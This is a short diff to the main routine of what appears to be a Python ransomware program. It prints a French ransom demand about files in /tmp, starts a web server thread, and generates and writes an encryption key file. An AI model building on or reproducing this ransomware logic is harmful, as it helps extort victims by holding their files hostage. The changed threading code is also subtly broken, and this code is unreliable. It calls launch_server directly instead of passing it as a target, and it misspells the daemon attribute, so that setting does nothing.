@@ -164,7 +164,10 @@ if __name__ == '__main__':
     else:
 
         print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp. \n NE RELANCEZ PAS LE MAIN SINON VIS FICHIERS SERONT PERDUS.")    
-        threading.Thread(server.launch_server(True)).start() #Lancement du serveur Web
+        
+        thread = threading.Thread(server.launch_server(True))
+        thread.deamon = True
+        thread.start() #Lancement du serveur Web
         rware.generate_key()
         print("coucou")
         rware.write_key('keyfile')
